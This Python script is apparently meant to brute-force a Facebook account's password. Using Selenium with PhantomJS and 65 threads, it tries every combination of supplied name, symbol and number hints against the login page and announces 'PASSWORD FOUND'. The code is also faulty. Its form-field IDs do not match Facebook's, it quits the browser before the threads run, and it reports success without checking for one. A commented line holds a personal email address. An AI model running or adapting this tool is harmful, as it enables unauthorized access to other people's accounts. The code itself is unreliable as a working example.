from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
import time
import argparse
import sys
import itertools
from queue import Queue
import threading
import os

driver = webdriver.PhantomJS()
#userId = "srikar.0896@gmail.com"
start_time = time.time()

#args
parser = argparse.ArgumentParser()
parser.add_argument("-user" , help = "Please Enter the username")
parser.add_argument("-name" , help = "Please enter the name hints separated by comma")
parser.add_argument("-sym" , help = "Please enter the Symbol hints separated by comma")
parser.add_argument("-num" , help = "Please enter the Number hints separated by comma")
args = parser.parse_args()
userId = args.user
arr1 = args.name.split(",")
arr2 = args.sym.split(",")
arr3 = args.num.split(",")

totalCombinations = len(arr1) * len(arr2) * len(arr3)
print("\t\t\t\t\t\t\tUsername - " + str(userId))
print("\t\t\t\t\t\t\t\tPortal - Facebook\n")
print("Name hints     - " + str(arr1))
print("Symbol hints   - " + str(arr2))
print("Number hints   - " + str(arr3))
print(" [*] Total number of Combinations - " + str(totalCombinations) + "\n")

res=itertools.product(arr1,arr2,arr3)
fails_count = 0

#File Object
f=open("password.txt","w+")

#Queue Object
q = Queue()

#Print_lock
print_lock=threading.Lock()

#Threader Function
def threader():
    while True:
        combination=q.get()
        passwordCracker(combination)
        q.task_done
def passwordCracker(combination):
    global fbPassword
    fbPassword = "".join(combination)
    try:
        driver.get("https://www.facebook.com")
        fbUsername = userId
        emailFieldID = ".//*[@id='SchSel_txtUserName']"
        passFieldID = ".//*[@id='SchSel_txtPassword']"
        loginButtonXPath = ".//*[@id='SchSel_btnLogin']"
        emailFieldElement = WebDriverWait(driver, 10).until(lambda driver: driver.find_element_by_xpath(emailFieldID))
        passFieldElement = WebDriverWait(driver, 10).until(lambda driver: driver.find_element_by_xpath(passFieldID))
        loginButtonElement = WebDriverWait(driver, 10).until(lambda driver: driver.find_element_by_xpath(loginButtonXPath))
        emailFieldElement.click()
        emailFieldElement.clear()
        emailFieldElement.send_keys(fbUsername)
        passFieldElement.click()
        passFieldElement.clear()
        passFieldElement.send_keys(fbPassword)
        loginButtonElement.click()
        #.WebDriverWait(driver, 10).until(lambda driver: driver.find_element_by_xpath(flLogoXpath))
        with print_lock:
                    #print("[+] PASSWORD FOUND - " + str(pas))
                    sys.stdout.write("\r \n\n[+] PASSWORD FOUND - " + str(fbPassword))
                    print("\n    Time Executed - " + str(time.time() - start_time))
                    print("    Password found by " + str(threading.current_thread().name))
                    sys.stdout.flush()
                #sys.stdout.write("\n")
        os._exit(1)
    except:
        driver.save_screenshot('error.png')
        global fails_count
        fails_count = fails_count + 1
        with print_lock:
            sys.stdout.write("\rFails - " + str(fails_count))
            sys.stdout.write(" [-] not match - " + str(fbPassword))
            sys.stdout.flush()
            print("\n" + str(e))
        #sys.stdout.write("\n")
            #print("[-] " + str(pas) + " not Match")
            if fails_count == totalCombinations:
                sys.stdout.write("\033[K")
                sys.stdout.flush()
                sys.stdout.write("\r\n\n [!] Bruteforce failed.")
                print("\n\n Time Elapsed - " + str(time.time() - start_time) + "sec")
                os._exit(1)


driver.quit()
# display.stop()

#Creating Threads
for thread in range(65):
    th = threading.Thread(target=threader)
    th.daemon = True
    th.start()

#putting the res values in to the Queue
for eachCombination in res:
    q.put(eachCombination)
q.join()
